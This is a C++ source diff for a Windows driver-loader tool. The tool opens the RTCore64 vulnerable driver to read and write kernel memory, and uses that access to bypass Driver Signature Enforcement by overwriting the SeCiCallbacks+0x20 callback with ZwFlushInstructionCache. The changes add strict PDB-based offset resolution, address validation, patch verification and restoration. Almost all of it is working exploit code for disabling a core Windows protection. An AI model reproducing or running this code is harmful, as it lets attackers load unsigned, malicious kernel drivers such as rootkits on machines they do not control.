@@ -92,40 +92,139 @@ std::optional<uint64_t> DrvLoader::GetNtoskrnlBase() {
     return std::nullopt;
 }
 
-bool DrvLoader::GetSymbolOffsets(uint64_t* seCiCallbacks, uint64_t* safeFunction) {
+std::optional<std::pair<uint64_t, uint64_t>> DrvLoader::GetTextSectionBounds(const std::wstring& ntoskrnlPath) {
+    HANDLE hFile = CreateFileW(ntoskrnlPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return std::nullopt;
+    }
+    
+    HANDLE hMapping = CreateFileMappingW(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
+    if (!hMapping) {
+        CloseHandle(hFile);
+        return std::nullopt;
+    }
+    
+    LPVOID pBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+    if (!pBase) {
+        CloseHandle(hMapping);
+        CloseHandle(hFile);
+        return std::nullopt;
+    }
+    
+    std::optional<std::pair<uint64_t, uint64_t>> result;
+    
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
+    if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
+        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pBase + pDos->e_lfanew);
+        if (pNt->Signature == IMAGE_NT_SIGNATURE) {
+            PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
+            
+            for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+                char sectionName[9] = {0};
+                memcpy(sectionName, pSection[i].Name, 8);
+                
+                if (strcmp(sectionName, ".text") == 0) {
+                    uint64_t textStart = pSection[i].VirtualAddress;
+                    uint64_t textEnd = textStart + pSection[i].Misc.VirtualSize;
+                    result = {textStart, textEnd};
+                    break;
+                }
+            }
+        }
+    }
+    
+    UnmapViewOfFile(pBase);
+    CloseHandle(hMapping);
+    CloseHandle(hFile);
+    
+    return result;
+}
+
+bool DrvLoader::ValidateKernelAddresses(uint64_t ntBase, uint64_t seCiRva, uint64_t zwRva) {
     WCHAR systemRoot[MAX_PATH];
     GetSystemDirectoryW(systemRoot, MAX_PATH);
     std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
     
+    // Get .text section bounds
+    auto textBounds = GetTextSectionBounds(ntoskrnlPath);
+    if (!textBounds) {
+        std::wcout << L"[-] Failed to read .text section from ntoskrnl.exe\n";
+        return false;
+    }
+    
+    auto [textStart, textEnd] = *textBounds;
+    
+    // Validate ZwFlushInstructionCache is in .text section
+    if (zwRva < textStart || zwRva >= textEnd) {
+        std::wcout << L"[-] ZwFlushInstructionCache offset 0x" << std::hex << zwRva 
+                   << L" is outside .text section [0x" << textStart << L"-0x" << textEnd << L"]\n" << std::dec;
+        return false;
+    }
+    
+    std::wcout << L"[+] ZwFlushInstructionCache validated in .text section\n";
+    
+    // Validate SeCiCallbacks address is readable
+    uint64_t seCiCallbacks = ntBase + seCiRva;
+    uint64_t callbackAddress = seCiCallbacks + 0x20;
+    
+    auto testRead = ReadMemory64(callbackAddress);
+    if (!testRead) {
+        std::wcout << L"[-] Cannot read SeCiCallbacks+0x20 at 0x" << std::hex << callbackAddress << std::dec << L"\n";
+        std::wcout << L"[-] Address may be invalid or driver primitives not working\n";
+        return false;
+    }
+    
+    std::wcout << L"[+] SeCiCallbacks address validated (readable)\n";
+    
+    return true;
+}
+
+std::optional<std::pair<uint64_t, uint64_t>> DrvLoader::ResolveKernelOffsetsStrict() {
+    WCHAR systemRoot[MAX_PATH];
+    GetSystemDirectoryW(systemRoot, MAX_PATH);
+    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
+    
+    std::wcout << L"[*] Strict offset resolution from PDB...\n";
+    
+    // Get PDB GUID from current ntoskrnl.exe
     auto [pdbName, pdbGuid] = symbolDownloader.GetPdbInfoFromPe(ntoskrnlPath);
     if (pdbGuid.empty()) {
-        std::wcout << L"[-] Failed to extract PDB GUID from kernel\n";
-        return false;
+        std::wcout << L"[-] Failed to extract PDB GUID from ntoskrnl.exe\n";
+        return std::nullopt;
     }
     
-    if (ConfigManager::LoadOffsetsFromWindowsMiniPdb(seCiCallbacks, safeFunction, pdbGuid)) {
-        std::wcout << L"[+] Using cached offsets for GUID: " << pdbGuid << L"\n";
-        return true;
-    }
+    std::wcout << L"[+] Current kernel PDB GUID: " << pdbGuid << L"\n";
     
-    std::wcout << L"[*] Downloading kernel symbols...\n";
+    // Ensure symbols exist in ProgramData store (download if needed)
     if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) {
-        std::wcout << L"[-] Failed to download symbols for ntoskrnl.exe\n";
+        std::wcout << L"[-] Failed to obtain PDB symbols\n";
+        return std::nullopt;
+    }
+    
+    // Resolve symbols from PDB
+    auto seCiOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SeCiCallbacks");
+    auto zwOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"ZwFlushInstructionCache");
+    
+    if (!seCiOpt || !zwOpt) {
+        std::wcout << L"[-] Failed to resolve required symbols from PDB\n";
+        return std::nullopt;
+    }
+    
+    std::wcout << L"[+] Resolved offsets from PDB:\n";
+    std::wcout << L"    SeCiCallbacks: 0x" << std::hex << *seCiOpt << std::dec << L"\n";
+    std::wcout << L"    ZwFlushInstructionCache: 0x" << std::hex << *zwOpt << std::dec << L"\n";
+    
+    return std::make_pair(*seCiOpt, *zwOpt);
+}
+
+bool DrvLoader::GetSymbolOffsets(uint64_t* seCiCallbacks, uint64_t* safeFunction) {
+    auto offsets = ResolveKernelOffsetsStrict();
+    if (!offsets) {
         return false;
     }
     
-    auto seCiOffset = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SeCiCallbacks");
-    auto zwFlushOffset = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"ZwFlushInstructionCache");
-    
-    if (!seCiOffset || !zwFlushOffset) {
-        std::wcout << L"[-] Failed to get symbol offsets\n";
-        return false;
-    }
-    
-    *seCiCallbacks = *seCiOffset;
-    *safeFunction = *zwFlushOffset;
-    
-    ConfigManager::CreateWindowsMiniPdb(*seCiCallbacks, *safeFunction, pdbGuid);
+    *seCiCallbacks = offsets->first;
+    *safeFunction = offsets->second;
     
     return true;
 }
@@ -193,50 +292,17 @@ bool DrvLoader::InstallAndStartDriver() {
     return true;
 }
 
-bool DrvLoader::TryLoadOffsetsFromCache(uint64_t* seCiCallbacks, uint64_t* safeFunction) {
-    WCHAR systemRoot[MAX_PATH];
-    GetSystemDirectoryW(systemRoot, MAX_PATH);
-    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
-    
-    auto [pdbName, pdbGuid] = symbolDownloader.GetPdbInfoFromPe(ntoskrnlPath);
-    if (pdbGuid.empty()) {
-        return false;
-    }
-    
-    return ConfigManager::LoadOffsetsFromWindowsMiniPdb(seCiCallbacks, safeFunction, pdbGuid);
-}
-
 bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     std::wcout << L"\n[=== Checking DSE Status ===]\n\n";
     
-    WCHAR systemRoot[MAX_PATH];
-    GetSystemDirectoryW(systemRoot, MAX_PATH);
-    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
-    
-    auto [pdbName, pdbGuid] = symbolDownloader.GetPdbInfoFromPe(ntoskrnlPath);
-    if (pdbGuid.empty()) {
-        std::wcout << L"[-] Failed to extract PDB GUID from kernel\n";
+    // Strict resolution - no cache
+    auto offsets = ResolveKernelOffsetsStrict();
+    if (!offsets) {
+        std::wcout << L"[-] Failed to resolve kernel offsets\n";
         return false;
     }
     
-    uint64_t seCiCallbacksOffset = 0;
-    uint64_t zwFlushOffset = 0;
-    bool usedCache = ConfigManager::LoadOffsetsFromWindowsMiniPdb(&seCiCallbacksOffset, &zwFlushOffset, pdbGuid);
-    
-    if (!usedCache) {
-        std::wcout << L"[*] Downloading symbols...\n";
-        
-        if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) return false;
-        
-        auto seCiOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SeCiCallbacks");
-        auto zwOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"ZwFlushInstructionCache");
-        
-        if (!seCiOpt || !zwOpt) return false;
-        
-        seCiCallbacksOffset = *seCiOpt;
-        zwFlushOffset = *zwOpt;
-        ConfigManager::CreateWindowsMiniPdb(seCiCallbacksOffset, zwFlushOffset, pdbGuid);
-    }
+    auto [seCiCallbacksOffset, zwFlushOffset] = *offsets;
     
     if (!InstallAndStartDriver()) return false;
     
@@ -248,6 +314,16 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     
     auto ntBase = GetNtoskrnlBase();
     if (!ntBase) {
+        Cleanup();
+        StopAndRemoveDriver();
+        return false;
+    }
+    
+    std::wcout << L"[+] ntoskrnl.exe base: 0x" << std::hex << *ntBase << std::dec << L"\n";
+    
+    // Validate addresses before checking status
+    if (!ValidateKernelAddresses(*ntBase, seCiCallbacksOffset, zwFlushOffset)) {
+        std::wcout << L"[-] Address validation failed - offsets may be incorrect\n";
         Cleanup();
         StopAndRemoveDriver();
         return false;
@@ -267,12 +343,13 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     isPatched = (*currentCallback == safeFunction);
     
     std::wcout << L"[+] DSE Status: " << (isPatched ? L"PATCHED" : L"ACTIVE") << L"\n";
+    std::wcout << L"    Current callback: 0x" << std::hex << *currentCallback << L"\n";
+    std::wcout << L"    Safe function: 0x" << safeFunction << std::dec << L"\n";
     
-    if (!usedCache) {
-        ConfigManager::UpdateDriversIni(seCiCallbacksOffset, zwFlushOffset);
-        std::wstring buildInfo = ConfigManager::GetWindowsBuildNumber();
-        ConfigManager::SaveOffsetsToRegistry(seCiCallbacksOffset, zwFlushOffset, buildInfo);
-    }
+    // Update configuration files with validated offsets
+    ConfigManager::UpdateDriversIni(seCiCallbacksOffset, zwFlushOffset);
+    std::wstring buildInfo = ConfigManager::GetWindowsBuildNumber();
+    ConfigManager::SaveOffsetsToRegistry(seCiCallbacksOffset, zwFlushOffset, buildInfo);
     
     Cleanup();
     StopAndRemoveDriver();
@@ -280,43 +357,71 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
 }
 
 bool DrvLoader::BypassDSEInternal() {
-    WCHAR systemRoot[MAX_PATH];
-    GetSystemDirectoryW(systemRoot, MAX_PATH);
-    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
-    
-    auto [pdbName, pdbGuid] = symbolDownloader.GetPdbInfoFromPe(ntoskrnlPath);
-    if (pdbGuid.empty()) {
-        std::wcout << L"[-] Failed to extract PDB GUID from kernel\n";
+    // Strict resolution - no cache
+    auto offsets = ResolveKernelOffsetsStrict();
+    if (!offsets) {
+        std::wcout << L"[-] Failed to resolve kernel offsets\n";
         return false;
     }
     
-    uint64_t seCiOffset = 0, zwFlushOffset = 0;
-    
-    if (!ConfigManager::LoadOffsetsFromWindowsMiniPdb(&seCiOffset, &zwFlushOffset, pdbGuid)) {
-        auto seCiOpt = GetKernelSymbolOffset(L"SeCiCallbacks");
-        auto zwOpt = GetKernelSymbolOffset(L"ZwFlushInstructionCache");
-        if (!seCiOpt || !zwOpt) return false;
-        seCiOffset = *seCiOpt;
-        zwFlushOffset = *zwOpt;
-        ConfigManager::CreateWindowsMiniPdb(seCiOffset, zwFlushOffset, pdbGuid);
-    }
+    auto [seCiOffset, zwFlushOffset] = *offsets;
     
     auto ntBase = GetNtoskrnlBase();
-    if (!ntBase) return false;
+    if (!ntBase) {
+        std::wcout << L"[-] Failed to get ntoskrnl.exe base address\n";
+        return false;
+    }
+    
+    std::wcout << L"[+] ntoskrnl.exe base: 0x" << std::hex << *ntBase << std::dec << L"\n";
+    
+    // Validate addresses before patching
+    if (!ValidateKernelAddresses(*ntBase, seCiOffset, zwFlushOffset)) {
+        std::wcout << L"[-] Address validation failed - aborting patch\n";
+        return false;
+    }
     
     uint64_t seCiCallbacks = *ntBase + seCiOffset;
     uint64_t safeFunction = *ntBase + zwFlushOffset;
     uint64_t callbackToPatch = seCiCallbacks + 0x20;
     
     auto currentCallback = ReadMemory64(callbackToPatch);
-    if (!currentCallback) return false;
+    if (!currentCallback) {
+        std::wcout << L"[-] Failed to read current callback\n";
+        return false;
+    }
     
-    if (*currentCallback == safeFunction) return true;
+    // Already patched?
+    if (*currentCallback == safeFunction) {
+        std::wcout << L"[+] DSE already bypassed\n";
+        return true;
+    }
     
+    std::wcout << L"[*] Patching callback:\n";
+    std::wcout << L"    From: 0x" << std::hex << *currentCallback << L"\n";
+    std::wcout << L"    To:   0x" << safeFunction << std::dec << L"\n";
+    
+    // Save original callback
     originalCallback = *currentCallback;
-    if (!ConfigManager::SaveOriginalCallbackToRegistry(*originalCallback)) return false;
+    if (!ConfigManager::SaveOriginalCallbackToRegistry(*originalCallback)) {
+        std::wcout << L"[-] Failed to save original callback to registry\n";
+        return false;
+    }
     
-    return WriteMemory64(callbackToPatch, safeFunction);
+    // Perform patch
+    if (!WriteMemory64(callbackToPatch, safeFunction)) {
+        std::wcout << L"[-] Failed to write patched callback\n";
+        return false;
+    }
+    
+    // Verify patch
+    auto verifyCallback = ReadMemory64(callbackToPatch);
+    if (!verifyCallback || *verifyCallback != safeFunction) {
+        std::wcout << L"[-] Patch verification failed\n";
+        return false;
+    }
+    
+    std::wcout << L"[+] DSE bypass successful\n";
+    return true;
 }
 
 bool DrvLoader::BypassDSE() {
@@ -547,54 +652,96 @@ bool DrvLoader::RemoveDriver(const std::wstring& serviceNameOrPath) {
 } 
 
 bool DrvLoader::RestoreDSEInternal() {
-    if (!originalCallback) return false;
-    
-    uint64_t seCiOffset = 0, zwFlushOffset = 0;
-    if (!TryLoadOffsetsFromCache(&seCiOffset, &zwFlushOffset)) {
-        auto seCiOpt = GetKernelSymbolOffset(L"SeCiCallbacks");
-        if (!seCiOpt) return false;
-        seCiOffset = *seCiOpt;
+    if (!originalCallback) {
+        std::wcout << L"[-] No original callback value available\n";
+        return false;
     }
-    
+
+    // Strict resolution
+    auto offsets = ResolveKernelOffsetsStrict();
+    if (!offsets) {
+        std::wcout << L"[-] Failed to resolve kernel offsets\n";
+        return false;
+    }
+
+    auto [seCiOffset, zwFlushOffset] = *offsets;
+
     auto ntBase = GetNtoskrnlBase();
-    if (!ntBase) return false;
-    
+    if (!ntBase) {
+        std::wcout << L"[-] Failed to get ntoskrnl.exe base address\n";
+        return false;
+    }
+
+    // Validate addresses
+    if (!ValidateKernelAddresses(*ntBase, seCiOffset, zwFlushOffset)) {
+        std::wcout << L"[-] Address validation failed\n";
+        return false;
+    }
+
     uint64_t callbackAddress = *ntBase + seCiOffset + 0x20;
-    
+
     auto currentCallback = ReadMemory64(callbackAddress);
-    if (!currentCallback) return false;
-    
+    if (!currentCallback) {
+        std::wcout << L"[-] Failed to read current callback\n";
+        return false;
+    }
+
+    // Already restored?
     if (*currentCallback == *originalCallback) {
+        std::wcout << L"[+] DSE already restored\n";
         ConfigManager::ClearPatchStateFromRegistry();
         return true;
     }
-    
+
+    std::wcout << L"[*] Restoring callback:\n";
+    std::wcout << L"    From: 0x" << std::hex << *currentCallback << L"\n";
+    std::wcout << L"    To:   0x" << *originalCallback << std::dec << L"\n";
+
     if (WriteMemory64(callbackAddress, *originalCallback)) {
+        // Verify restoration
+
+        auto verifyCallback = ReadMemory64(callbackAddress);
+        if (!verifyCallback || *verifyCallback != *originalCallback) {
+            std::wcout << L"[-] Restoration verification failed\n";
+            return false;
+        }
+
+        std::wcout << L"[+] DSE restored successfully\n";
         ConfigManager::ClearPatchStateFromRegistry();
         return true;
     }
-    
+
+    std::wcout << L"[-] Failed to restore callback\n";
     return false;
 }
 
 bool DrvLoader::RestoreDSE() {
     std::wcout << L"\n[=== Restore DSE ===]\n";
-    
     if (!originalCallback) {
         std::wcout << L"[-] No original callback state known\n";
         return false;
     }
-    
-    if (!InstallAndStartDriver()) return false;
-    
-    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (!InstallAndStartDriver())
+        return false;
+
+    hDriver = CreateFileW(
+        L"\\\\.\\RTCore64",
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        nullptr,
+        OPEN_EXISTING,
+        0,
+        nullptr
+    );
+
     if (hDriver == INVALID_HANDLE_VALUE) {
         StopAndRemoveDriver();
         return false;
     }
-    
+
     bool result = RestoreDSEInternal();
-    
+
     Cleanup();
     StopAndRemoveDriver();
     return result;
